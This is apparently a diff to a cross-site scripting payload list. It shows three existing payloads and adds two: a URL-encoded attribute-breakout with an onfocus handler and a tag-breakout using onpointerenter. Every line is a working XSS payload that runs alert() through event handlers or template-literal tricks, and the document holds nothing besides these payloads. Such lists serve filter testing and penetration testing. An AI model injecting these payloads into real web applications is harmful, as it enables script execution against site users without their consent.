@@ -1,3 +1,5 @@
 <iframe onload=alert`ss`>
 <marquee onstart='javascript:alert('1');'>ss
 ''.replace.call`1${/./}${alert}` 
+%27%20onfocus=%27alert(/xss/)
+"><P/onpointerenter=alert(1)>
